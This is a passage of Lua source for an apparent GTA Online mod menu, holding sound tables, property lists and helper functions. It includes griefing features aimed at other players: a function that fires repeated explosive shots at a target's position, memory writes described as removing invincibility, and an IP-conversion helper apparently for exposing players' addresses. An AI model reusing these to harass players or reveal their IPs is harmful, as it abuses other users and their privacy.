    {"Hit_Out", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"HORDE_COOL_DOWN_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"HUD_FREEMODE_CANCEL_MASTER", "0"},
    {"Kill_List_Counter", "GTAO_FM_Events_Soundset"},
    {"LEADERBOARD", "HUD_MINI_GAME_SOUNDSET"},
    {"Lights_On", "GTAO_MUGSHOT_ROOM_SOUNDS"},
    {"LIMIT", "DLC_APT_YACHT_DOOR_SOUNDS"},
    {"Load_Scene", "DLC_Dmod_Prop_Editor_Sounds"},
    {"LOCAL_PLYR_CASH_COUNTER_COMPLETE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"LOCAL_PLYR_CASH_COUNTER_INCREASE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"LOOSE_MATCH", "HUD_MINI_GAME_SOUNDSET"},
    {"Lose_1st", "GTAO_FM_Events_Soundset"},
    {"LOSER", "HUD_AWARDS"},
    {"Map_Roll_Down", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Map_Roll_Up", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"MARKER_ERASE", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"MARTIN1_DISTANT_TRAIN_HORNS_MASTER", "0"},
    {"MEDAL_BRONZE", "HUD_AWARDS"},
    {"MEDAL_GOLD", "HUD_AWARDS"},
    {"MEDAL_SILVER", "HUD_AWARDS"},
    {"MEDAL_UP", "HUD_MINI_GAME_SOUNDSET"},
    {"Menu_Accept", "Phone_SoundSet_Default"},
    {"Mission_Pass_Notify", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"MP_5_SECOND_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_AWARD", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_Flash", "WastedSounds"},
    {"MP_IDLE_KICK", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_IDLE_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_Impact", "WastedSounds"},
    {"MP_RANK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_WAVE_COMPLETE", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"NAV", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Nav_Arrow_Ahead", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Behind", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Left", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Right", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"NAV_LEFT_RIGHT", "HUD_FREEMODE_SOUNDSET"},
    {"NAV_UP_DOWN", "HUD_FREEMODE_SOUNDSET"},
    {"Near_Miss_Counter_Reset", "GTAO_FM_Events_Soundset"},
    {"NO", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Object_Dropped_Remote", "GTAO_FM_Events_Soundset"},
    {"Off_High", "MP_RADIO_SFX"},
    {"OK", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"ON", "NOIR_FILTER_SOUNDS"},
    {"On_Call_Player_Join", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"OOB_Cancel", "GTAO_FM_Events_Soundset"},
    {"OOB_Start", "GTAO_FM_Events_Soundset"},
    {"OPEN_WINDOW", "LESTER1A_SOUNDS"},
    {"OPENED", "MP_PROPERTIES_ELEVATOR_DOORS"},
    {"OTHER_TEXT", "HUD_AWARDS"},
    {"Out_Of_Area", "DLC_Lowrider_Relay_Race_Sounds"},
    {"Out_Of_Bounds_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Paper_Shuffle", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Parcel_Vehicle_Lost", "GTAO_FM_Events_Soundset"},
    {"Payment_Non_Player", "DLC_HEISTS_GENERIC_SOUNDS"},
    {"Payment_Player", "DLC_HEISTS_GENERIC_SOUNDS"},
    {"Pen_Tick", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"PERSON_SCROLL", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"PERSON_SELECT", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"Phone_Generic_Key_02", "HUD_MINIGAME_SOUNDSET"},
    {"PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Pin_Bad", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"PIN_BUTTON", "ATM_SOUNDS"},
    {"Pin_Centred", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"Pin_Good", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"PIPES_LAND", "CONSTRUCTION_ACCIDENT_1_SOUNDS"},
    {"Place_Prop_Fail", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Place_Prop_Success", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Player_Collect", "DLC_PILOT_MP_HUD_SOUNDS"},
    {"Player_Enter_Line", "GTAO_FM_Cross_The_Line_Soundset"},
    {"Player_Exit_Line", "GTAO_FM_Cross_The_Line_Soundset"},
    {"Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Pre_Screen_Stinger", "DLC_HEISTS_FAILED_SCREEN_SOUNDS"},
    {"PS2A_MONEY_LOST", "PALETO_SCORE_2A_BANK_SS"},
    {"PURCHASE", "HUD_LIQUOR_STORE_SOUNDSET"},
    {"Put_Away", "Phone_SoundSet_Michael"},
    {"QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"QUIT_WHOOSH", "HUD_MINI_GAME_SOUNDSET"},
    {"RACE_PLACED", "HUD_AWARDS"},
    {"RAMP_DOWN", "TRUCK_RAMP_DOWN"},
    {"RAMP_UP", "TRUCK_RAMP_DOWN"},
    {"RANK_UP", "HUD_AWARDS"},
    {"REMOTE_PLYR_CASH_COUNTER_COMPLETE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"REMOTE_PLYR_CASH_COUNTER_INCREASE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Reset_Prop_Position", "DLC_Dmod_Prop_Editor_Sounds"},
    {"RESTART", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"RETRY", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET"},
    {"ROPE_CUT", "ROPE_CUT_SOUNDSET"},
    --{"ROUND_ENDING_STINGER_CUSTOM", "CELEBRATION_SOUNDSET"},
    {"Save_Scene", "DLC_Dmod_Prop_Editor_Sounds"},
    {"SCOPE_UI_MASTER", "0"},
    {"ScreenFlash", "WastedSounds"},
    {"SCREEN_SWIPE", "CELEBRATION_SWIPE"},
    {"SELECT", "HUD_FREEMODE_SOUNDSET"},
    {"Select_Placed_Prop", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Shard_Disappear", "GTAO_FM_Events_Soundset"},
    {"SHOOTING_RANGE_ROUND_OVER", "HUD_AWARDS"},
    {"Short_Transition_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Short_Transition_Out", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"SKIP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Start", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"STUN_COLLECT", "MINUTE_MAN_01_SOUNDSET"},
    {"Success", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Swap_Sides", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"SWING_SHUT", "GTAO_APT_DOOR_DOWNSTAIRS_GLASS_SOUNDS"},
    {"Tattooing_Oneshot", "TATTOOIST_SOUNDS"},
    {"Tattooing_Oneshot_Remove", "TATTOOIST_SOUNDS"},
    {"Team_Capture_Start", "GTAO_Magnate_Yacht_Attack_Soundset"},
    {"TENNIS_MATCH_POINT", "HUD_AWARDS"},
    {"TENNIS_POINT_WON", "HUD_AWARDS"},
    {"TextHit", "WastedSounds"},
    {"TOGGLE_ON", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Turn", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"UNDER_THE_BRIDGE", "HUD_AWARDS"},
    {"WAYPOINT_SET", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"WEAPON_ATTACHMENT_EQUIP", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_ATTACHMENT_UNEQUIP", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_PURCHASE", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_SELECT_ARMOR", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Whoosh_1s_L_to_R", "MP_LOBBY_SOUNDS"},
    {"Whoosh_1s_R_to_L", "MP_LOBBY_SOUNDS"},
    {"WIN", "HUD_AWARDS"},
    {"Zone_Enemy_Capture", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zone_Neutral", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zone_Team_Capture", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zoom_In", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Left", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Out", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Right", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Checkpoint_Finish_Winner", "DLC_Tuner_Car_Meet_Test_Area_Events_Sounds"},
    {"Checkpoint", "DLC_Tuner_Car_Meet_Test_Area_Events_Sounds"},
}

--物体前置
function RequestModel(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
    wait()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
    end
    
    All_business_properties = {
    -- Clubhouses
    "1334 Roy Lowenstein Blvd",
    "7 Del Perro Beach",
    "75 Elgin Avenue",
    "101 Route 68",
    "1 Paleto Blvd",
    "47 Algonquin Blvd",
    "137 Capital Blvd",
    "2214 Clinton Avenue",
    "1778 Hawick Avenue",
    "2111 East Joshua Road",
    "68 Paleto Blvd",
    "4 Goma Street",
    -- Facilities
    "Grand Senora Desert",
    "Route 68",
    "Sandy Shores",
    "Mount Gordo",
    "Paleto Bay",
    "Lago Zancudo",
    "Zancudo River",
    "Ron Alternates Wind Farm",
    "Land Act Reservoir",
    -- Arcades
    "Pixel Pete's - Paleto Bay",
    "Wonderama - Grapeseed",
    "Warehouse - Davis",
    "Eight-Bit - Vinewood",
    "Insert Coin - Rockford Hills",
    "Videogeddon - La Mesa",
    }
    
    small_warehouses = {
    [1] = "Pacific Bait Storage", 
    [2] = "White Widow Garage", 
    [3] = "Celltowa Unit", 
    [4] = "Convenience Store Lockup", 
    [5] = "Foreclosed Garage", 
    [9] = "Pier 400 Utility Building", 
    }
    
    medium_warehouses = {
    [7] = "Derriere Lingerie Backlot", 
    [10] = "GEE Warehouse", 
    [11] = "LS Marine Building 3", 
    [12] = "Railyard Warehouse", 
    [13] = "Fridgit Annexe",
    [14] = "Disused Factory Outlet", 
    [15] = "Discount Retail Unit", 
    [21] = "Old Power Station", 
    }
    
    large_warehouses = {
    [6] = "Xero Gas Factory",  
    [8] = "Bilgeco Warehouse", 
    [16] = "Logistics Depot", 
    [17] = "Darnell Bros Warehouse", 
    [18] = "Wholesale Furniture", 
    [19] = "Cypress Warehouses", 
    [20] = "West Vinewood Backlot", 
    [22] = "Walker & Sons Warehouse"
    }
    
    proofs = {
    bullet = {name="Bullets",on=false},
    fire = {name="Fire",on=false},
    explosion = {name="Explosions",on=false},
    collision = {name="Collision",on=false},
    melee = {name="Melee",on=false},
    steam = {name="Steam",on=false},
    drown = {name="Drowning",on=false},
    }
    
    modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
    }
    
    things = {
    "brickade2",
    "hauler",
    "hauler2",
    "manchez3",
    "terbyte",
    "minitank"
    }
    
    
    doors = {
    "v_ilev_ml_door1",
    "v_ilev_ta_door",
    "v_ilev_247door",
    "v_ilev_247door_r",
    "v_ilev_lostdoor",
    "v_ilev_bs_door",
    "v_ilev_cs_door01",
    "v_ilev_cs_door01_r",
    "v_ilev_gc_door03",
    "v_ilev_gc_door04",
    "v_ilev_clothmiddoor",
    "v_ilev_clothmiddoor",
    "prop_shop_front_door_l",
    "prop_shop_front_door_r"
    }
    
    object_stuff = {
    names = {
    "Hamburger",
    "UFO",
    "Ferris Wheel",
    "Windmill",
    "Cement Mixer",
    "Scaffolding",
    "Garage Door",
    "Big Bowling Ball",
    "Big Soccer Ball",
    "Big Orange Ball",
    "Stunt Ramp",
    
    },
    objects = {
    "xs_prop_hamburgher_wl",
    "p_spinning_anus_s",
    "prop_ld_ferris_wheel",
    "prop_windmill_01",
    "prop_staticmixer_01",
    "prop_towercrane_02a",
    "des_scaffolding_root",
    "prop_sm1_11_garaged",
    "stt_prop_stunt_bowling_ball",
    "stt_prop_stunt_soccer_ball",
    "prop_juicestand",
    "stt_prop_stunt_jump_l",
    }
    }
    
    values = {
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
    }
    
    unreleased_vehicles = {
    "virtue",
    "broadway",
    "everon2",
    "eudora",
    "boor"
    }
--空中漂移
function slerp(q1, q2, t)
    local cosTheta = q1.x * q2.x + q1.y * q2.y + q1.z * q2.z + q1.w * q2.w
    local startInterp, finishInterp

    if cosTheta < 0.0 then
        cosTheta = -cosTheta
        q2.x = -q2.x
        q2.y = -q2.y
        q2.z = -q2.z
        q2.w = -q2.w
    end

    if (1.0 - cosTheta) > 0.0001 then
        local theta = math.acos(cosTheta)
        local sinTheta = math.sin(theta)
        startInterp = math.sin((1.0 - t) * theta) / sinTheta
        finishInterp = math.sin(t * theta) / sinTheta
    else
        startInterp = 1.0 - t
        finishInterp = t
    end

    local x = startInterp * q1.x + finishInterp * q2.x
    local y = startInterp * q1.y + finishInterp * q2.y
    local z = startInterp * q1.z + finishInterp * q2.z
    local w = startInterp * q1.w + finishInterp * q2.w

    return {x = x, y = y, z = z, w = w}
end

function AllowVehicleToBePlacedInGarage(pid, veh)
    local networkId = NETWORK.VEH_TO_NET(veh);
    if (NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(veh)) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(networkId, true);
        VEHICLE.SET_VEHICLE_IS_STOLEN(veh, false);
    end
end

function addBlipForEntity(entity, blipSprite, colour)
    local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
    HUD.SET_BLIP_SPRITE(blip, blipSprite)
    HUD.SET_BLIP_COLOUR(blip, colour)
    HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
    HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(entity, false)
    util.create_thread(function()
        while not ENTITY.IS_ENTITY_DEAD(entity) do
            local heading = ENTITY.GET_ENTITY_HEADING(entity)
            HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(heading))
            wait()
            if ENTITY.IS_ENTITY_DEAD(entity) or ENTITY.IS_ENTITY_DEAD(entity) or not ENTITY.DOES_ENTITY_EXIST(entity) or VEHICLE.GET_VEHICLE_ENGINE_HEALTH(entity) <= 0 then
                util.remove_blip(blip)
                wait()
            end
        end
    end)
    return blip
end
--获取信息
function intToIp(num)
    ip = ""
    local int16 = string.format("%x", num)
    for i = 1, #int16 do
      if 0 == math.fmod(i, 2) then
        if ip ~= "" then
          ip = ip .. "." .. var_int
        else
          ip = var_int
        end
      else
        var_int = tostring(tonumber(string.sub(int16, i, i + 1), 16))
      end
    end
    return ip
end

--移除无敌/送到医院
function setBit(addr: number, bit: number)
	memory.write_int(addr, memory.read_int(addr) | 1 << bit)
end
function clearBit(addr: number, bit: number)
	memory.write_int(addr, memory.read_int(addr) ~ 1 << bit)
end

--飞天炸弹
function boomfly(a)
local offset = v3(0, 0, 0)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    airshash = util.joaat("vehicle_weapon_trailer_dualaa")
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z- 1 , pos.x, pos.y, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z- 1 , pos.x+2, pos.y, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z- 1 , pos.x-2, pos.y, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z- 1 , pos.x-2, pos.y-2, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z- 1 , pos.x-2, pos.y+2, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 1 , pos.x, pos.y, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 1 , pos.x+2, pos.y, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 1 , pos.x-2, pos.y, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 1 , pos.x-2, pos.y-2, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 1 , pos.x-2, pos.y+2, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 3 , pos.x, pos.y, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 3, pos.x+2, pos.y, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 3, pos.x-2, pos.y, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 3 , pos.x-2, pos.y-2, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 3 , pos.x-2, pos.y+2, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 5, pos.x, pos.y, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 5 , pos.x+2, pos.y, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 5 , pos.x-2, pos.y, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 5, pos.x-2, pos.y-2, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 5 , pos.x-2, pos.y+2, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 7 , pos.x, pos.y, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 7 , pos.x+2, pos.y, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 7 , pos.x-2, pos.y, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 7 , pos.x-2, pos.y-2, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 7 , pos.x-2, pos.y+2, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 9 , pos.x, pos.y, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 9 , pos.x+2, pos.y, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 9 , pos.x-2, pos.y, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 9 , pos.x-2, pos.y-2, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 9 , pos.x-2, pos.y+2, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 11 , pos.x, pos.y, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 11 , pos.x+2, pos.y, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 11 , pos.x-2, pos.y, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 11 , pos.x-2, pos.y-2, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 11 , pos.x-2, pos.y+2, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 13 , pos.x, pos.y, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 13 , pos.x+2, pos.y, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 13 , pos.x-2, pos.y, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 13 , pos.x-2, pos.y-2, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 13 , pos.x-2, pos.y+2, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 15 , pos.x, pos.y, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 15 , pos.x+2, pos.y, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 15 , pos.x-2, pos.y, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 15 , pos.x-2, pos.y-2, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 15 , pos.x-2, pos.y+2, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 17 , pos.x, pos.y, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 17 , pos.x+2, pos.y, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 17 , pos.x-2, pos.y, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 17 , pos.x-2, pos.y-2, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 17 , pos.x-2, pos.y+2, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 19 , pos.x, pos.y, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 19 , pos.x+2, pos.y, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 19 , pos.x-2, pos.y, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 19 , pos.x-2, pos.y-2, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 19 , pos.x-2, pos.y+2, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 21 , pos.x, pos.y, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 21 , pos.x+2, pos.y, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 21 , pos.x-2, pos.y, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 21 , pos.x-2, pos.y-2, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 21 , pos.x-2, pos.y+2, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 23 , pos.x, pos.y, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 23 , pos.x+2, pos.y, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
